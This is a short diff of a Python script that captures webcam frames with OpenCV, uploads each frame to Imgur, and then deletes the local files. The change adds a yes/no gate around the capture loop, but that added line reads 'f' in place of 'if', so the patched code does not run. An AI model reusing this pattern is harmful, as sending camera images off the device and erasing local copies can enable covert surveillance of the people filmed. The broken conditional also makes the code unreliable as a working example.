@@ -33,18 +33,18 @@ elif os_type == 1:
     print ("Are you sure you have a front and back camera? type 'y' for yes and 'n' for no")
 verifying_type = str(input(' '))
 #recording video
-
-start = time.time() + 6
-currentFrame = 0
-cap = cv2.VideoCapture(os_type) 
-while time.time() <= start:
-    ret, frame = cap.read()
-    name = './frame' + str(currentFrame) + '.png'
-    print ('Creating...' + name)
-    cv2.imwrite(name, frame)
-    imgur(name)
-    os.remove(name)
-    currentFrame += 1
+f verifying_type == 'y': 
+    start = time.time() + 3
+    currentFrame = 0
+    cap = cv2.VideoCapture(os_type) 
+    while time.time() <= start:
+        ret, frame = cap.read()
+        name = './frame' + str(currentFrame) + '.png'
+        print ('Creating...' + name)
+        cv2.imwrite(name, frame)
+        imgur(name)
+        os.remove(name)
+        currentFrame += 1
 # Stop recording
 cv2.destroyAllWindows()
 cap.release()
